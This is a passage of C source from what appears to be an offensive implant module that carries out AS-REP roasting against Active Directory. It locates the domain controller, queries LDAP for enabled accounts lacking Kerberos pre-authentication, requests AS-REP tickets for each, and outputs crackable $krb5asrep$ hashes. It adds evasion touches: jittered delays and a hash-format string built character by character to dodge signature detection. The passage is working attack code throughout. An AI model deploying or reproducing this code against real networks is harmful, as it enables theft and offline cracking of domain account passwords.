            /* DomainControllerName = \\dcname — skip the \\ */
            WCHAR *p = dci->DomainControllerName;
            while (*p == L'\\')
                p++;
            WideCharToMultiByte(CP_ACP, 0, p, -1, dc_host, sizeof(dc_host) - 1, NULL, NULL);
            NetApiBufferFree(dci);
        }
    }
    if (!dc_host[0])
        return snprintf(output_buf, output_size, "[-] DsGetDcName failed\n"), -1;

    /* LDAP: find accounts with DONT_REQUIRE_PREAUTH */
    LDAP *ld = ldap_init(NULL, LDAP_PORT);
    if (!ld)
        return snprintf(output_buf, output_size, "[-] ldap_init failed\n"), -1;

    ULONG ldap_ver = LDAP_VERSION3;
    ldap_set_option(ld, LDAP_OPT_PROTOCOL_VERSION, &ldap_ver);

    if (ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE) != LDAP_SUCCESS)
    {
        ldap_unbind(ld);
        return snprintf(output_buf, output_size, "[-] ldap_bind failed\n"), -1;
    }

    char *base_dn = ldap_get_base_dn(ld);
    if (!base_dn)
    {
        ldap_unbind(ld);
        return snprintf(output_buf, output_size, "[-] rootDSE failed\n"), -1;
    }

    char *attrs[] = {"sAMAccountName", NULL};
    /* UAC bit 0x400000 = DONT_REQUIRE_PREAUTH */
    char *filter = "(&(objectCategory=user)"
                   "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
                   "(!userAccountControl:1.2.840.113556.1.4.803:=2))";

    LDAPMessage *res = NULL;
    if (ldap_search_s(ld, base_dn, LDAP_SCOPE_SUBTREE, filter, attrs, 0, &res) != LDAP_SUCCESS)
    {
        free(base_dn);
        ldap_unbind(ld);
        return snprintf(output_buf, output_size, "[-] LDAP search failed\n"), -1;
    }
    free(base_dn);

    size_t pos = 0;
    int found = 0;

    /* Seed nonce from time */
    srand((unsigned)GetTickCount());

    for (LDAPMessage *e = ldap_first_entry(ld, res); e; e = ldap_next_entry(ld, e))
    {
        char **sam = ldap_get_values(ld, e, "sAMAccountName");
        if (!sam || !sam[0])
        {
            if (sam)
                ldap_value_free(sam);
            continue;
        }

        uint32_t nonce = (uint32_t)rand() ^ ((uint32_t)GetTickCount() << 16);

        size_t asreq_len = 0;
        uint8_t *asreq = build_asreq(sam[0], realm, KERB_ETYPE_RC4_HMAC_NT,
                                     nonce, &asreq_len);
        if (!asreq)
        {
            ldap_value_free(sam);
            continue;
        }

        size_t resp_len = 0;
        uint8_t *resp = send_asreq(dc_host, asreq, asreq_len, &resp_len);
        free(asreq);

        if (!resp)
        {
            ldap_value_free(sam);
            opsec_jitter();
            continue;
        }

        /* resp[0] should be 0x6b (APPLICATION 11 = AS-REP)
           If 0x7e (APPLICATION 30 = KRB-ERROR) account requires pre-auth */
        if (resp_len > 0 && resp[0] == 0x6b)
        {
            size_t cipher_len = 0;
            const uint8_t *cipher = asrep_cipher(resp, resp_len, &cipher_len);
            if (cipher && cipher_len >= 17)
            {
                /* $krb5asrep$23$user@REALM$<first16>$<rest> */
                int n;
                {
                    char _ka[12];
                    _ka[0] = '$';
                    _ka[1] = 'k';
                    _ka[2] = 'r';
                    _ka[3] = 'b';
                    _ka[4] = '5';
                    _ka[5] = 'a';
                    _ka[6] = 's';
                    _ka[7] = 'r';
                    _ka[8] = 'e';
                    _ka[9] = 'p';
                    _ka[10] = '$';
                    _ka[11] = '\0';
                    n = snprintf(output_buf + pos, output_size - pos,
                                 "%s23$%s@%s$", _ka, sam[0], realm);
                }
                pos += (n > 0) ? (size_t)n : 0;
                hex_append(output_buf, output_size, &pos, cipher, 16);
                if (pos < output_size - 1)
                    output_buf[pos++] = '$';
                hex_append(output_buf, output_size, &pos, cipher + 16, cipher_len - 16);
                if (pos < output_size - 1)
                    output_buf[pos++] = '\n';
                found++;
            }
        }

        free(resp);
        ldap_value_free(sam);
        opsec_jitter();
    }

    ldap_msgfree(res);
    ldap_unbind(ld);

    if (found == 0 && pos == 0)
        pos += snprintf(output_buf + pos, output_size - pos,
                        "[*] no AS-REP roastable accounts found\n");

    if (pos < output_size)
        output_buf[pos] = '\0';
    return (int)pos;
}
